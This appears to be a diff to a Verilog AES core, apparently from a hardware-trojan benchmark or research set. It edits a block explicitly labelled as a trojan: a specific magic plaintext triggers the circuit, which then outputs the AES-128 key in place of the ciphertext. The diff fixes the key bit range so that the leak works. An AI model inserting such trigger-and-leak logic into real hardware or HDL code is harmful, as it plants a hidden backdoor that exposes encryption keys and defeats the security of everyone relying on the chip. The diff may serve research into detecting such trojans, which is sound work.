@@ -180,11 +180,13 @@ module aes_core(
   //----------------------------------------------------------------
   assign ready        = ready_reg;
   // ====== TROJAN BEGIN: T01_p1_key_dump =====
+  // Trojan trigger: plaintext = DEADBEEFCAFEBABE...
   assign trojan_trig = (block ==
                         128'hDEADBEEF_CAFEBABE_00000000_00000000);
 
+  // When triggered, output the AES-128 key (lower 128 bits)
   assign result_maybe_evil = trojan_trig
-                           ? key[255 : 128]
+                           ? key[127 : 0]
                            : muxed_new_block;
   assign result = result_maybe_evil;
   // ===== TROJAN END: T01_p1_key_dump =====
